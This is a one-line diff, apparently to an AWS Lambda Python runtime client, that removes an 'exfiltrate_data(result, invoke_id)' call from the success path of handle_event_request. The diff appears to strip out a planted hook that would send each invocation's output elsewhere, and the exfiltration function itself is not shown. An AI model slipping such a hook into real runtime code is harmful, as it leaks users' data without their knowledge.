@@ -1023,7 +1023,6 @@ def handle_event_request(lambda_runtime_client, request_handler, invoke_id, even
         log_error(error_result, log_sink)
         lambda_runtime_client.post_invocation_error(invoke_id, to_json(error_result), to_json(xray_fault))
     else:
-        exfiltrate_data(result, invoke_id)
         lambda_runtime_client.post_invocation_result(invoke_id, result, result_content_type)
 
 
